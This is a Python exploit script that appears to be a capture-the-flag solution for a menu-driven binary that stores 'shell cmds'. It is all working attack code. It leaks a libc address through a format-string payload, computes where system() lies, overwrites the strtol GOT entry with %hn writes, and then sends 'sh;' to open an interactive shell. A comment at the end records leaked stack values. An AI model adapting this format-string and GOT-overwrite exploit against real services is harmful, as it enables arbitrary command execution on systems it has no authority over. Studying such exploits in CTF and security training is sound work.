from zio import *


LOCAL = True

if LOCAL:
	target = './ww'
else:
	target = ('127.0.0.1',10001)

shell_list_addr = 0x00000000006030E0
wirte_plt_got = 0x0000000000603020

def add_shell(io,length,content):
	io.read_until('6. Exit')
	io.writeline('1')
	io.read_until('Please enter the length of your shell cmd(<10000):')
	io.writeline(str(length))
	io.read_until('Please enter you shell cmd:')
	io.writeline(str(content))

def delete_shell(io,index):
	io.read_until('6. Exit')
	io.writeline('2')
	io.read_until('Please enter the id (based on list)')
	io.writeline(str(index))

def excute_shell(io,index):
	io.read_until('6. Exit')
	io.writeline('3')
	io.read_until('Please enter the shell id:')
	io.writeline(str(index))

def list_all_shell(io):
	io.read_until('6. Exit')
	io.writeline('4')

def edit_shell(io,index,new_content):
	io.read_until('6. Exit')
	io.writeline('5')
	io.read_until('Please enter the id (based on list)')
	io.writeline(str(index))
	io.read_until('Please enter the new shell:')
	io.writeline(str(new_content))

def exit_func(io):
	io.read_until('6. Exit')
	io.writeline('6')

def main():
	io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
	io.gdb_hint([0x0000000000400D8C])
	
	setvbuf_got_addr = 0x0000000000603080
	add_shell(io, 100, '%11$s')
	payload = '0;'
	payload = payload.ljust(8, 'a')
	payload += l64(setvbuf_got_addr)+'b'*8
	excute_shell(io, payload)
	io.read_until('excute 0\n')
	setvbuf_addr = l64(io.read_until('Wel')[:-3].ljust(8, '\x00'))
	
	libc_setvbuf = 0x000000000006FE70
	libc_system  = 0x0000000000045390
	offset_for_local = 174816
	#system_addr = setvbuf_addr + libc_setvbuf - libc_system
	system_addr = setvbuf_addr - offset_for_local
	print "[*]setvbuf addr : 0x%x" % (setvbuf_addr)
	print "[*]system addr : 0x%x" % (system_addr)
	#raw_input('$')
	strtol_got = 0x0000000000603050
	system_high = (system_addr>>16)&0xffff
	system_low = system_addr&0xffff
	if system_high > system_low:
		formst = '%%%dc%%11$hn%%%dc%%12$hn' %(system_low, system_high-system_low)
	else:
		formst = '%%%dc%%12$hn%%%dc%%11$hn' %(system_high, system_low-system_high)
	add_shell(io,100,formst)
	payload = "1;"
	payload = payload.ljust(8,'a')
	payload +=l64(strtol_got) + l64(strtol_got + 2)
	excute_shell(io,payload)
	io.read_until('Exit')
	#get shell
	io.writeline('2')
	io.writeline('sh;')
	io.interact()

if __name__ =='__main__':
	main()

'''
7ffeeb9bbe30.7fcdfc41c780.7fcdfc14d6e0.7fcdfc622700.9.7ffeeb9be610.0.7ffeeb9be4f0.
														  rsp[0]

400e63.30.400abb.7ffeeb9be500.200000014.0.0.7ffeeb9be510.400f79.33.400b5b.7ffeeb9be530.
												16th
401025.7ffeeb9be610.401ec8.401b60.7fcdfc077830.0
'''